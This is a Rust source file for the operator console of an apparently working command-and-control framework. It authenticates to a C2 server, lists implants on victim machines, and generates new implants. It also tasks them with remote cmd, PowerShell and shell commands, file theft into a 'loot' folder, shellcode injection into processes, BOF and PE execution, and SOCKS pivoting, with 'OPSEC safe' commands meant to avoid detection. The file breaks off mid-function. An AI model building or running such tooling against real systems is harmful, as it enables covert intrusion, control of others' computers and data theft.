mod commands; // Import the commands module

use base64::{engine::general_purpose, Engine as _};
use chrono::{DateTime, NaiveDateTime, Utc};
use commands::{read_and_encode, retrieve_all_output_with_polling};
use crossterm::event::{self, Event, KeyCode, KeyEvent, KeyEventKind, KeyEventState, KeyModifiers};
use futures::StreamExt;
use ratatui as tui;
use reqwest::{
    header::{HeaderMap, HeaderName, HeaderValue},
    ClientBuilder,
};
//use rusqlite::Connection;
use serde::Deserialize;
use std::{
    collections::VecDeque,
    error::Error,
    io,
    sync::{Arc, Mutex},
};
use tokio::time::{interval, sleep, Duration};
use tui::{
    backend::CrosstermBackend,
    layout::{Constraint, Direction, Layout, Rect},
    style::{Color, Style},
    text::{Span, Spans},
    widgets::{Block, BorderType, Borders, Cell, Paragraph, Row, Table},
    Terminal,
};

use config::{Config, File};

#[derive(Deserialize, Debug, Clone, PartialEq)]
pub struct ImpInfo {
    session: String,
    ip: String,
    username: String,
    domain: String,
    os: String,
    imp_pid: String,
    process_name: String,
    sleep: String,
    last_check_in: String,
}

enum AppMode {
    MainDashboard,
    SessionInteraction(String, String), // Holds session ID
}

struct App {
    url: String,
    username: String,
    password: String,
    input_mode: InputMode,
    command_text: String,
    command_output: VecDeque<String>,
    mode: AppMode,
    //trying to make fields scrollable
    imp_scroll_position: usize,
    max_displayed_items: usize,
    output_scroll_position: usize,
    max_displayed_output_lines: usize,
}

enum InputMode {
    Url,
    Username,
    Password,
}

impl Default for App {
    fn default() -> App {
        App {
            url: String::new(),
            username: String::new(),
            password: String::new(),
            input_mode: InputMode::Url,
            command_text: String::new(),
            command_output: VecDeque::with_capacity(10),
            mode: AppMode::MainDashboard,
            imp_scroll_position: 0,
            max_displayed_items: 10, //need to adjust this to fit the screen
            output_scroll_position: 0,
            max_displayed_output_lines: 99, //need to adjust this to fit the screen
        }
    }
}

const MAX_OUTPUT_LINES: usize = 1000; // Set this to the maximum number of lines you want to keep

impl App {
    pub fn add_output(&mut self, line: String) {
        if self.command_output.len() == MAX_OUTPUT_LINES {
            self.command_output.pop_front(); // Remove the oldest line
        }
        self.command_output.push_back(line); // Add the new line

        // Print the length of command_output for debugging
        //println!("command_output length: {}", self.command_output.len());
    }
}

//use crossterm::event::{self, KeyCode, KeyEvent};

async fn handle_command(
    command_text: &str,
    imp_info: &Vec<ImpInfo>,
    app: &mut App,
    token: &str,
) -> String {
    let ctokens: Vec<&str> = command_text.split_whitespace().collect();

    if ctokens.len() == 2 && ctokens[0] == "use" {
        let session_id = ctokens[1].to_string();
        for info in imp_info.iter() {
            let last_8_chars: String = info
                .session
                .chars()
                .rev()
                .take(8)
                .collect::<String>()
                .chars()
                .rev()
                .collect();
            if session_id == last_8_chars {
                //let full_session_id = info.session.clone();
                // Update app mode
                let _sleep = info.sleep.clone();
                app.mode = AppMode::SessionInteraction(info.session.clone(), info.sleep.clone());
                return "Switched to session.".to_string();
            }
        }
        return "Error: Invalid session ID.".to_string();
    } else if
    // To accommodate additional commands, you can add more else if conditions here.
    command_text == "help" {
        return "Available commands: \n
        help - displays this help information\r
        build <target_os> <format> <target_ip> <target_port> <sleep> <jitter> - generate a new implant\r
        use <session> - interact with an imp\r
        q - quit the program\r
        ".to_string();
    } else if command_text == "q" || command_text == "quit" {
        std::process::exit(0);
    } else if ctokens.len() == 7 && ctokens[0] == "build" {
        let target = ctokens[1];
        let format = ctokens[2];
        let target_ip = ctokens[3];
        let target_port = ctokens[4];
        let tsleep = ctokens[5];
        let jitter = ctokens[6];
        // Build a new implant
        let url = app.url.clone();

        let build_res = commands::build(
            &token,
            &url,
            target,
            target_ip,
            target_port,
            tsleep,
            format,
            jitter,
        )
        .await;
        match build_res {
            Ok(output) => {
                return output;
            }
            Err(e) => {
                return format!("Error: {}", e);
            }
        }
    } else {
        return "Unknown command.".to_string();
    }
}

async fn handle_session_command(
    command_text: &str,
    session_id: &str,
    app: &mut App,
    token: &str,
    url: &str,
    _sleep: &str,
    os_version: &str,
) -> String {
    //split the command text into a vector of args
    let arg_split = command_text.split(' ');
    let args = arg_split.collect::<Vec<&str>>();

    //check what the 1st command is for matching
    let command = args[0];

    // we want to find out if the imp is linux or windows based before we display a help menu
    // we can do this by checking the os_version field in the imp_info vector, which was passed to this function as an argument
    // we can then use this information to display the correct help menu

    //if the os_version is windows, display the windows help menu

    //if the os_version is linux, display the linux help menu

    //if the os_version is unknown, display the generic help menu

    //setup the windows help menu
    let help_menu_win = "Available commands: \n
            help - displays this help information\r
            whoami - OPSEC 'safe' priv check\r
            ipconfig - OPSEC 'safe' ipconfig\r
            ps - list user processes\r
            cd <dir> - change directory\r
            pwd - print working directory\r
            ls <dir> - list directory contents\r
            catfile <remote_file> - read file content directly\r
            getfile <remote_file> - download file to local disk\r
            sendfile <local_filepath> - upload file to implant\r
            cmd <cmd> - run cmd command\r
            pwsh <cmd> - run powershell command\r
            wmi <query> - run WMI query\r
            bof <file> - run BOF file\r
            inject <pid> <shellcode.bin> - inject shellcode into process\r
            runpe <file> - run dotnet PE file\r
            socks <ip> <port> - start socks proxy\r
            sleep <seconds> <jitter percentage> - change sleep time. jitter optional\r
            kill - kill the implant\r
            q or quit - exit imp session\r";

    //setup the linux help menu
    let help_menu_linux = "Available commands: \n
            help - displays this help information\r
            whoami - get username. TODO: replace with priv check.\r
            cd <dir> - change directory\r
            pwd - print working directory\r
            ls <dir> - list directory contents\r
            catfile <remote_file> - read file content directly\r
            getfile <remote_file> - download file to local disk\r
            sendfile <local_filepath> - upload file to implant\r
            sh <cmd> - run shell command\r
            socks <ip> <port> - start socks proxy\r
            sleep <seconds> <jitter percentage> - change sleep time. jitter optional\r
            kill - kill the implant\r
            q or quit - exit imp session\r";

    //setup the generic help menu
    let help_menu_generic = "Available commands: \n
            help - displays this help information\r
            whoami - OPSEC 'safe' priv check\r
            ipconfig - OPSEC 'safe' ipconfig\r
            ps - list user processes\r
            cd <dir> - change directory\r
            pwd - print working directory\r
            ls <dir> - list directory contents\r
            catfile <remote_file> - read file content directly\r
            getfile <remote_file> - download file to local disk\r
            sendfile <local_filepath> - upload file to implant\r
            cmd <cmd> - run cmd command\r
            pwsh <cmd> - run powershell command\r
            sh <cmd> - run shell command\r
            wmi <query> - run WMI query\r
            bof <file> - run BOF file\r
            inject <pid> <shellcode.bin> - inject shellcode into process\r
            runpe <file> - run dotnet PE file\r
            socks <ip> <port> - start socks proxy\r
            sleep <seconds> <jitter percentage> - change sleep time. jitter optional\r
            kill - kill the implant\r
            q or quit - exit imp session\r";

    // To accommodate additional commands, you can add more else if conditions here.
    match command {
        "help" =>
        //we need to see if the os version contains windows. the os_version may not exactly read windows or linux,
        //so we need to check if it contains the word windows or linux
        //if it does, we can display the appropriate help menu
        //if it doesn't, we can display the generic help menu
        //because we are using contains, we should change the os_version to lowercase before checking
        {
            let os_version = os_version.to_lowercase();
            if os_version.contains("windows") {
                return help_menu_win.to_string();
            } else if os_version.contains("linux") {
                return help_menu_linux.to_string();
            } else {
                return help_menu_generic.to_string();
            }
        }
        "q" | "quit" => {
            app.mode = AppMode::MainDashboard;
            "Exited session.".to_string()
        }
        "whoami" | "ipconfig" | "ps" | "cd" | "pwd" | "ls" | "catfile" | "getfile" | "cmd"
        | "pwsh" | "sh" | "shell" | "wmi" | "socks" | "sleep" | "kill" => {
            issue_task(&command_text, session_id, token, url).await
        }
        "sendfile" => {
            let file = read_and_encode(command_text.split_whitespace().collect::<Vec<&str>>());
            let command_text = format!("{} {}", command, file);
            issue_task(&command_text, session_id, token, url).await
        }
        "bof" => {
            //make sure we grab just the filename from the command_text for file.
            //the filename is the 2nd word in the command_text
            //let file = read_and_encode(command_text.split_whitespace().collect::<Vec<&str>>());
            use commands::send_bof;

            let file = (command_text.split_whitespace().collect::<Vec<&str>>())[1];
            //println!("File: {}", file);
            //println!("URL: {}", url);
            //println!("Token: {}", token);
            //upload file to server
            if let Err(e) = send_bof(file, url, token).await {
                eprintln!("Error: {}", e);
            }

            //get just the filename from the full path contained in file variable

            use std::path::Path;
            let path = Path::new(&file);
            let filename = match path.file_name() {
                Some(name) => match name.to_str() {
                    Some(str_name) => str_name,
                    None => {
                        return "Invalid file name.".to_string();
                    }
                },
                None => {
                    return "Invalid file name.".to_string();
                }
            };

            let command_args = command_text.split_whitespace().collect::<Vec<&str>>();
            match command_args.len() {
                2 => {
                    let command = command_args[0];
                    let command_text = format!("{} {}", command, filename);
                    issue_task(&command_text, session_id, token, url).await
                }
                3 => {
                    let command = command_args[0];
                    let command_text = format!("{} {} {}", command, filename, command_args[2]);
                    issue_task(&command_text, session_id, token, url).await
                }
                4 => {
                    let command = command_args[0];
                    let command_text = format!(
                        "{} {} {} {}",
                        command, filename, command_args[2], command_args[3]
                    );
                    issue_task(&command_text, session_id, token, url).await
                }
                5 => {
                    let command_text = format!(
                        "{} {} {} {} {}",
                        command, filename, command_args[2], command_args[3], command_args[4]
                    );
                    issue_task(&command_text, session_id, token, url).await
                }
                _ => "Invalid Command".to_string(),
            }
        }
        "inject" => {
            //the filename is the 3rd word in the command_text
            //let file = read_and_encode(command_text.split_whitespace().collect::<Vec<&str>>());
            use commands::send_bof;

            let file = (command_text.split_whitespace().collect::<Vec<&str>>())[2];
            //upload file to server
            if let Err(e) = send_bof(file, url, token).await {
                eprintln!("Error: {}", e);
            }

            //get just the filename from the full path contained in file variable

            use std::path::Path;
            let path = Path::new(&file);
            let filename = match path.file_name() {
                Some(name) => match name.to_str() {
                    Some(str_name) => str_name,
                    None => {
                        return "Invalid file name.".to_string();
                    }
                },
                None => {
                    return "Invalid file name.".to_string();
                }
            };

            let command_args = command_text.split_whitespace().collect::<Vec<&str>>();
            match command_args.len() {
                3 => {
                    let command = command_args[0];
                    let command_text = format!("{} {} {}", command, command_args[1], filename);
                    issue_task(&command_text, session_id, token, url).await
                }
                _ => "Invalid Command".to_string(),
            }
        }
        "runpe" => {
            //the filename is the 2nd word in the command_text
            use commands::send_bof;

            let command_args = command_text.split_whitespace().collect::<Vec<&str>>();
            if command_args.len() < 2 {
                return "Error: Not enough arguments provided.".to_string();
            }
            let file = command_args[1];
            //upload file to server
            if let Err(e) = send_bof(file, url, token).await {
                eprintln!("Error: {}", e);
            }

            //get just the filename from the full path contained in file variable

            use std::path::Path;
            let path = Path::new(&file);
            let filename = match path.file_name() {
                Some(name) => match name.to_str() {
                    Some(str_name) => str_name,
                    None => {
                        return "Invalid file name.".to_string();
                    }
                },
                None => {
                    return "Invalid file name.".to_string();
                }
            };

            //let command_args = command_text.split_whitespace().collect::<Vec<&str>>();
            match command_args.len() {
                2 => {
                    let command = command_args[0];
                    let command_text = format!("{} {}", command, filename);
                    issue_task(&command_text, session_id, token, url).await
                }
                3 => {
                    let command = command_args[0];
                    let command_text = format!("{} {} {}", command, filename, command_args[2]);
                    issue_task(&command_text, session_id, token, url).await
                }

                _ => "Unknown command.".to_string(),
            }
        }
        _ => "Unknown command.".to_string(),
    }
}

async fn issue_task(command_text: &str, session_id: &str, token: &str, url: &str) -> String {
    let url = format!("https://{}/issue_task", url);

    let client = match ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()
    {
        Ok(cli) => cli,
        Err(_) => {
            return "Failed to build the client".to_string();
        }
    };

    let mut headers = HeaderMap::new();
    match HeaderValue::from_str(token) {
        Ok(value) => headers.insert(HeaderName::from_static("x-token"), value),
        Err(_) => return "Invalid token".to_string(),
    };
    match HeaderValue::from_str(session_id) {
        Ok(value) => headers.insert(HeaderName::from_static("x-session"), value),
        Err(_) => return "Invalid session ID".to_string(),
    };
    match HeaderValue::from_str(command_text) {
        Ok(value) => headers.insert(HeaderName::from_static("x-task"), value),
        Err(_) => return "Invalid command text".to_string(),
    };

    let res = match client.post(&url).headers(headers).send().await {
        Ok(response) => response,
        Err(_) => return "Failed to send request to server".to_string(),
    };

    if res.status().is_success() {
        "Successfully issued task to server.".to_string()
    } else {
        "Failed to issue task to server.".to_string()
    }
}

async fn get_input(
    terminal: &mut Terminal<CrosstermBackend<io::Stdout>>,
    app: &mut App,
) -> Result<String, Box<dyn Error>> {
    // Load the configuration
    let mut settings = Config::default();
    settings.merge(File::with_name("config"))?;
    let server_port: u16 = settings.get("server.port")?;

    // Draw the initial UI
    terminal.draw(|f| ui(f, &app))?;
    
    loop {
        match event::read()? {
            Event::Key(key_event) => match key_event.code {
                KeyCode::Enter | KeyCode::Tab => match app.input_mode {
                    InputMode::Url => {
                        if app.url.is_empty() {
                            continue;
                        }
                        // Append the port to the URL
                        if !app.url.contains(':') {
                            app.url = format!("{}:{}", app.url, server_port);
                        }
                        app.input_mode = InputMode::Username;
                    }
                    InputMode::Username => {
                        if app.username.is_empty() {
                            continue;
                        }
                        app.input_mode = InputMode::Password;
                    }
                    InputMode::Password => {
                        if app.password.is_empty() {
                            continue;
                        }
                        return Ok(app.password.clone());
                    }
                },
                KeyCode::Char(c) => match app.input_mode {
                    InputMode::Url => app.url.push(c),
                    InputMode::Username => app.username.push(c),
                    InputMode::Password => app.password.push(c),
                },
                KeyCode::Backspace => match app.input_mode {
                    InputMode::Url => {
                        app.url.pop();
                    }
                    InputMode::Username => {
                        app.username.pop();
                    }
                    InputMode::Password => {
                        app.password.pop();
                    }
                },
                _ => {}
            },
            _ => {}
        }

        terminal.draw(|f| ui(f, &app))?;
    }
}

fn ui(f: &mut tui::Frame<tui::backend::CrosstermBackend<io::Stdout>>, app: &App) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints(
            [
                Constraint::Percentage(50),
                Constraint::Length(3),
                Constraint::Length(3),
                Constraint::Length(3),
                Constraint::Min(0),
            ]
            .as_ref(),
        )
        .split(f.size());

    let banner_art = vec![
        "██████████████████████████████████████████████████████████████████████████████████████████████████████████████",
        "█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█░░░░░░░░░░░░███░░░░░░██░░░░░░█░░░░░░░░░░█░░░░░░░░░░░░░░█",
        "█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█",
        "█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░░░▄▀░░░░█░░░░░░▄▀░░░░░░█",
        "█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████",
        "█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████",
        "█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████",
        "█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████",
        "█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████",
        "█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░░░▄▀░░█░░░░▄▀░░░░█████░░▄▀░░█████",
        "█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀░░█████░░▄▀░░█████",
        "█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░█████░░░░░░█████",
        "██████████████████████████████████████████████████████████████████████████████████████████████████████████████"
    ];

    let block = Block::default().borders(Borders::ALL);

    let banner_text: Vec<Spans> = banner_art
        .iter()
        .map(|line| Spans::from(line.to_string()))
        .collect();

    let banner_paragraph = Paragraph::new(banner_text).block(
        Block::default()
            .borders(Borders::ALL)
            .title("Banner")
            .style(Style::default().fg(Color::White).bg(Color::Rgb(33, 1, 99)))
            .border_type(BorderType::Plain),
    );
    f.render_widget(banner_paragraph, chunks[0]);

    let url_style = match app.input_mode {
        InputMode::Url => Style::default().fg(Color::LightBlue),
        _ => Style::default(),
    };
    let url_paragraph = Paragraph::new(app.url.as_ref())
        .style(url_style)
        .block(block.clone().title("Url"));
    f.render_widget(url_paragraph, chunks[1]);

    let username_style = match app.input_mode {
        InputMode::Username => Style::default().fg(Color::LightBlue),
        _ => Style::default(),
    };
    let username_paragraph = Paragraph::new(app.username.as_ref())
        .style(username_style)
        .block(block.clone().title("Username"));
    f.render_widget(username_paragraph, chunks[2]);

    let password_style = match app.input_mode {
        InputMode::Password => Style::default().fg(Color::LightBlue),
        _ => Style::default(),
    };
    let password_input = app.password.chars().map(|_| "*").collect::<String>();
    let password_paragraph = Paragraph::new(password_input.as_str())
        .style(password_style)
        .block(block.title("Password"));
    f.render_widget(password_paragraph, chunks[3]);
}

async fn authenticate(url: &str, username: &str, password: &str) -> Result<String, Box<dyn Error>> {
    let url = format!("https://{}/authenticate", url);

    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(30)) // Set a timeout of 30 seconds
        .build()?;

    let up64 = general_purpose::STANDARD.encode(format!("{}:{}", username, password));

    let auth = format!("Basic {}", up64);

    let res = client
        .post(&url)
        .header("Authorization", auth)
        .send()
        .await?;

    if res.status().is_success() {
        let body = res.text().await?;
        Ok(body.trim().to_string())
    } else {
        panic!("Login failed.");
    }
}

async fn check_db_and_update_output(url: &str, token: &str, ui_refresh_tx: Sender<String>) {
    let mut previous_output = String::new();
    loop {
        if let Ok(imp_info) = fetch_imp_info(url, token).await {
            let initial_interval = 2; // seconds
            let _current_interval = initial_interval;
            let _max_interval = 30; // seconds
            let max_total_wait = 120; // maximum total wait time in seconds
            let mut total_waited = 0;
            let sleep_vec = imp_info
                .iter()
                .map(|imp| imp.sleep.parse::<i32>().unwrap_or(0))
                .min();
            let s = "3";
            let mut _sleep = match s.parse::<i32>() {
                Ok(i) => i,
                Err(_) => {
                    eprintln!("Could not parse string to integer");
                    3 // Return a default value
                }
            };

            match sleep_vec {
                Some(sleep) => {
                    _sleep = sleep;
                }
                None => {
                    _sleep = 3; // Set _sleep to the default value
                }
            }

            //use tokio::time::{sleep, Duration}; //redundant import. remove later

            while total_waited < max_total_wait {
                match retrieve_all_output_with_polling(imp_info.clone(), token, url).await {
                    Ok(outputs) if !outputs.is_empty() => {
                        for output in outputs {
                            if output == "none" || output == previous_output {
                                continue;
                            }
                            //let retrieved_output = format!("\n{:?}", (output.clone()));
                            //preprend a new line to the output without using format! because it changes the output
                            //let output = format!("\n{}", output);

                            //let output = "\n".to_owned() + &output;

                            //if the output string contains newline characters, then split it into a vector of strings and send each line individually
                            if output.contains("\n") {
                                let output_vec: Vec<&str> = output.split("\n").collect();
                                for line in output_vec {
                                    if let Err(e) = ui_refresh_tx.send(line.to_string()).await {
                                        eprintln!("Failed to send data: {}", e);
                                    }
                                }
                            } else {
                                if let Err(e) = ui_refresh_tx.send(output.clone()).await {
                                    eprintln!("Failed to send data: {}", e);
                                }
                            }

                            /*if let Err(e) = ui_refresh_tx.send(output.clone()).await {
                                eprintln!("Failed to send data: {}", e);
                            }*/
                            previous_output = output;
                        }
                    }
                    _ => {}
                }

                sleep(Duration::from_secs(_sleep.try_into().unwrap())).await;
                total_waited += _sleep;
            }
        } else {
            let new_output = "\nError fetching imp info";
            if let Err(e) = ui_refresh_tx.send(new_output.to_string()).await {
                eprintln!("Failed to send data: {}", e);
            }
            break; // Break the loop if there's an error fetching imp info
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    //create loot folder if it doesn't exist
    std::fs::create_dir_all("loot")?;

    //disable_raw_mode()?;
    //enable raw mode
    crossterm::terminal::enable_raw_mode()?;

    // Create a new terminal

    let backend = CrosstermBackend::new(io::stdout());
    let mut terminal = Terminal::new(backend)?;

    let mut app = App::default();

    terminal.clear()?;

    //println!("Generating database... Please be patient...");

    /* i don't think i need this db anymore. leftover from prior testing. may re-enable for logging
    // Database creation and initialization in a separate blocking task
    let database_url = "./client.db"; // Adjust the path as needed
    let db = tokio::task::spawn_blocking(move || {
        let conn = rusqlite::Connection::open(&database_url)?;
        conn.execute(
            "CREATE TABLE IF NOT EXISTS tasks (
                task_name TEXT NOT NULL,
                session_id TEXT NOT NULL,
                token TEXT NOT NULL,
                url TEXT NOT NULL,
                sleep_time TEXT NOT NULL
            )",
            []
        )?;
        Ok::<_, rusqlite::Error>(conn)
    }).await??;

    let db = Arc::new(aMutex::new(db));
    */

    terminal.clear()?;

    //send key event to trigger drawing dashboard
    //i dont think this is needed anymore but its not hurting anything
    // Create a dummy key event
    let dummy_event = KeyEvent {
        code: KeyCode::NumLock,
        modifiers: KeyModifiers::NONE,
        kind: KeyEventKind::Press,
        state: KeyEventState::NONE,
    };

    // Send the dummy event to the input channel
    let (input_tx, _input_rx) = tokio::sync::mpsc::channel(100);
    let _ = input_tx.send(dummy_event).await;

    let _ = get_input(&mut terminal, &mut app).await;

    match authenticate(&app.url, &app.username, &app.password).await {
        Ok(token) => {
            //disable_raw_mode()?;
            crossterm::terminal::enable_raw_mode()?;
            //println!("Authentication successful. Token: {}", token)
            //this is where we will change the app state to logged in, which will then change the UI to our main dashboard
            //we will also begin a looping function that will retrieve data from a remote server via API call and update the UI
            // Create a channel to communicate between the fetcher task and the main task.
            let (tx, mut rx) = tokio::sync::mpsc::channel(1);
            let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(100);
            let (ui_refresh_tx, mut ui_refresh_rx) = tokio::sync::mpsc::channel(10);

            // Spawn a task to fetch the imp information periodically
            tokio::spawn(fetch_imp_info_periodically(
                app.url.clone(),
                token.clone(),
                tx,
                ui_refresh_tx.clone()
            ));

            // handle input task
            //i think this next part is what is causing the issue with the ui not loading until a key is pressed
            tokio::spawn(async move {
                let mut stdin = crossterm::event::EventStream::new();
                while let Some(Ok(event)) = stdin.next().await {
                    if let crossterm::event::Event::Key(key_event) = event {
                        let _ = input_tx.send(key_event).await;
                    }
                }
            });

            let mut imp_info = Vec::new();

            let _app_mutex = Arc::new(Mutex::new(App::default()));
            //disabling db for now
            //let _db_mutex = db.clone(); // Assuming db is your Connection object

            let url = app.url.clone();
            use tokio::task::JoinHandle;

            // Clone the URL variable
            let url_clone = url.clone();
            let token_forout = token.clone();

            // Spawn a task to check the database and update the output
            let _handle: JoinHandle<()> = tokio::spawn(async move {
                check_db_and_update_output(&url_clone, &token_forout, ui_refresh_tx).await;
            });

            loop {
                tokio::select! {
                                    Some(key_event) = input_rx.recv() => {
                                        match app.mode {
                                            AppMode::MainDashboard => {
                                                match key_event.code {
                                                    KeyCode::Char(c) => {
                                                        app.command_text.push(c);
                                                    }
                                                    KeyCode::Enter => {
                                                        let command_text = app.command_text.clone();  // Clone the command_text
                                                        //clone token for use in the handle_command function
                                                        let token_clone = token.clone();
                                                        let command_string = handle_command(&command_text, &imp_info, &mut app, &token_clone).await;
                                                        app.command_output = VecDeque::from(vec![command_string]);
                                                        app.command_text.clear();
                                                    },
                                                    KeyCode::Backspace => {
                                                        app.command_text.pop();
                                                    },
                                                    KeyCode::PageDown => {
                                                        if app.imp_scroll_position < imp_info.len().saturating_sub(1) {
                                                            app.imp_scroll_position += 1;
                                                        }
                                                    },
                                                    KeyCode::PageUp => {
                                                        if app.imp_scroll_position > 0 {
                                                            app.imp_scroll_position -= 1;
                                                        }
                                                    },
                                                    KeyCode::Down => {
                                                        if app.output_scroll_position < app.command_output.len().saturating_sub(1) {
                                                            app.output_scroll_position += 1;
                                                        }
                                                    },
                                                    KeyCode::Up => {
                                                        if app.output_scroll_position > 0 {
                                                            app.output_scroll_position -= 1;
                                                        }
                                                    },
                                                    _ => {}
                                                }
                                            },
                                            AppMode::SessionInteraction(ref session_id, ref sleep) => {
                                                let session_id_clone = session_id.clone();  // Clone the session_id
                                                //perhaps here we can check the session_id and see what the OS is and then pass that to the handle_session_command function
                                                //I think we should be able to get the OS from the imp_info vector

                                                let os_version = imp_info.iter().find(|imp| imp.session == session_id_clone).unwrap().os.clone();

                                                let sleep_clone = sleep.clone();
                                                match key_event.code {
                                                    KeyCode::Char(c) => {
                                                        app.command_text.push(c);
                                                    }
                                                    KeyCode::Enter => {
                                                        let command_text = app.command_text.clone(); // Clone the command_text
                                                        let token_clone = token.clone(); // Clone the token
                                                        let url_clone = app.url.clone(); // Clone the url
                                                        let command_string = handle_session_command(&command_text, &session_id_clone, &mut app, &token_clone, &url_clone, &sleep_clone, &os_version).await;

                                                        // Clear the command_output before adding new lines
                                                        app.command_output.clear();

                                                        // Split the command_string into lines and add each line to the command_output
                                                        for line in command_string.lines() {
                                                            app.command_output.push_back(line.to_string());
                                                        }

                                                        app.command_text.clear();
                                                    },
                                                    KeyCode::Backspace => {
                                                        app.command_text.pop();
                                                    },
                                                    KeyCode::PageDown => {
                                                        if app.imp_scroll_position < imp_info.len().saturating_sub(1) {
                                                            app.imp_scroll_position += 1;
                                                        }
                                                    },
                                                    KeyCode::PageUp => {
                                                        if app.imp_scroll_position > 0 {
                                                            app.imp_scroll_position -= 1;
                                                        }
                                                    },
                                                    KeyCode::Down => {
                                                        if app.output_scroll_position < app.command_output.len().saturating_sub(1) {
                                                            app.output_scroll_position += 1;
                                                        }
                                                    },
                                                    KeyCode::Up => {
                                                        if app.output_scroll_position > 0 {
                                                            app.output_scroll_position -= 1;
                                                        }
                                                    },
                                                    _ => {}
                                                }
                                            }
                                        }
                                        terminal.draw(|f| draw_dashboard(f, f.size(), &imp_info, &mut app))?;
                                    },
                                    Some(info) = rx.recv() => {
                                        imp_info = info;
                                        terminal.draw(|f| draw_dashboard(f, f.size(), &imp_info, &mut app))?;
                                    },
                                    // Listen for UI refresh signals
                                    Some(new_output) = ui_refresh_rx.recv() => {
                                        //println!("Received message from ui_refresh_rx");

                                        app.add_output(new_output); // Update the command_output with new data
                                    terminal.draw(|f| draw_dashboard(f, f.size(), &imp_info, &mut app))?;
                            }
                                }
            }
        }

        Err(err) => {
            //disable_raw_mode()?;
            crossterm::terminal::enable_raw_mode()?;
            eprintln!("Authentication failed: {}", err);
        }
    }

    Ok(())
}

//functions

use tokio::sync::mpsc::Sender;

async fn fetch_imp_info_periodically(url: String, token: String, tx: Sender<Vec<ImpInfo>>, ui_refresh_tx: Sender<String>) {
    let mut interval = interval(Duration::from_secs(1));
    let mut error_sent = false; // Flag to track if an error message has been sent

    loop {
        interval.tick().await;
        let _start = std::time::Instant::now();
        match fetch_imp_info(&url, &token).await {
            Ok(imp_info) => {
                if error_sent {
                    // Send a message indicating that the connection was re-established
                    let reestablished_message = "Connection re-established";
                    if let Err(e) = ui_refresh_tx.send(reestablished_message.to_string()).await {
                        eprintln!("Failed to send data: {}", e);
                    }
                }
                error_sent = false; // Reset the flag when connection is successful
                // Store the fetched information into the shared state
                if tx.send(imp_info).await.is_err() {
                    eprintln!("Receiver has been dropped!");
                    break;
                }
            }
            Err(e) => {
                if !error_sent {
                    let new_output = format!("Error fetching imp info: {}", e);
                    if let Err(e) = ui_refresh_tx.send(new_output).await {
                        eprintln!("Failed to send data: {}", e);
                    }
                    error_sent = true; // Set the flag to indicate an error message has been sent
                }
            }
        }
    }
}

// Fetch imp info
async fn fetch_imp_info(
    url: &str,
    token: &str,
) -> Result<Vec<ImpInfo>, Box<dyn Error + Send + Sync>> {
    //setup the url
    //let url = format!("https://{}:8080/imps", url);
    let url = format!("https://{}/imps", url);

    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()?;

    let _auth = format!("X-Token {}", token);

    let res = client.get(url).header("X-Token", token).send().await?;

    //println!("Sending request...");
    //let res = client.get(url).header("Authorization", auth).send().await?;

    // Handle the result of the request
    if res.status().is_success() {
        let body = res.text().await?;
        //print!("Received response: {:}", body);

        // Here we're assuming the server response can be deserialized into a vector of ImpInfo.
        let imp_info: Vec<ImpInfo> = serde_json::from_str(&body)?;

        Ok(imp_info)
    } else {
        let status = res.status();
        Err(format!("Failed to retrieve imp info. Status: {}", status).into())
    }
}

use ratatui::backend::Backend;
use ratatui::widgets::Wrap;
use ratatui::Frame;

fn draw_dashboard<B>(f: &mut Frame<B>, chunk: Rect, imp_info: &Vec<ImpInfo>, app: &mut App)
where
    B: Backend,
{
    {
        //let area = f.size();  // Get the area of the frame
        let chunks = Layout::default()
            .direction(Direction::Vertical)
            .constraints(
                [
                    Constraint::Length(3),
                    Constraint::Percentage(37),
                    Constraint::Percentage(50), // This is for the command oputput
                    Constraint::Percentage(3),  // This is for the command input
                                                //Constraint::Min(0),
                ]
                .as_ref(),
            )
            .split(chunk);

        app.max_displayed_items = chunks[1].height as usize;
        app.max_displayed_output_lines = chunks[2].height as usize;

        let block = Block::default()
            .borders(Borders::ALL)
